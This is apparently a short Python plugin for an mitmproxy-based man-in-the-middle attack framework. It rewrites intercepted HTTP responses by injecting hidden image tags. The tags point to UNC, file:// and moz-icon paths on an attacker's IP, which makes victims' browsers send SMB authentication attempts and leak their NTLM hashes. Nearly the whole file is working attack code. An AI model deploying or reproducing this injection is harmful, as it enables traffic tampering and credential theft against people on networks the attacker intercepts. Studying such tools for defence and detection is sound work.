from plugins.plugin import Plugin
from bs4 import BeautifulSoup
from libmproxy.protocol.http import decoded

class SMBAuth(Plugin):
    name = 'SMBAuth'
    optname = 'smbauth'
    desc = "Evoke SMB challenge-response auth attempts"
    version = '0.1'

    def response(self, context, flow):
        with decoded(flow.response):  # Remove content encoding (gzip, ...)
            html = BeautifulSoup(flow.response.content)
            if html.body:

                payload = BeautifulSoup(self._get_payload(), "html.parser")
                html.body.append(payload)
                context.log("[SMBAuth] Injected payload: {}".format(flow.request.host))

                flow.response.content = str(html)
                flow.response.headers['Content-Length'] = [str(len(str(html)))]

    def _get_payload(self):
        return '<img src=\"\\\\{}\\image.jpg\">'\
               '<img src=\"file://///{}\\image.jpg\">'\
               '<img src=\"moz-icon:file:///%%5c/{}\\image.jpg\">'.format(*tuple([self.options.ip]*3))